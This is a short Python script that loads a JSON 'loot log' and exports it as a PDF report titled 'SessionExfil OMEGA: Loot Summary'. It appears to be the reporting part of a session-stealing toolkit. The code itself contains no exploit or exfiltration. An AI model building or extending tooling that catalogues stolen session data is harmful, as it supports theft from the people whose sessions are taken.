import json
from fpdf import FPDF
from datetime import datetime

LOOT_PATH = "loot_log.json"

def generate_loot_report(output="loot_summary.pdf"):
    try:
        with open(LOOT_PATH, "r") as f:
            loot = json.load(f)
    except:
        print("[!] Failed to load loot log.")
        return

    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="SessionExfil OMEGA: Loot Summary", ln=1, align="C")
    pdf.cell(200, 10, txt="Generated: " + datetime.utcnow().isoformat(), ln=2)

    for item in loot:
        entry = f"[{item['timestamp']}] {item['type']} - {item['data']}"
        pdf.multi_cell(0, 10, entry)

    pdf.output(output)
    print(f"[+] Final loot summary exported: {output}")

if __name__ == "__main__":
    generate_loot_report()
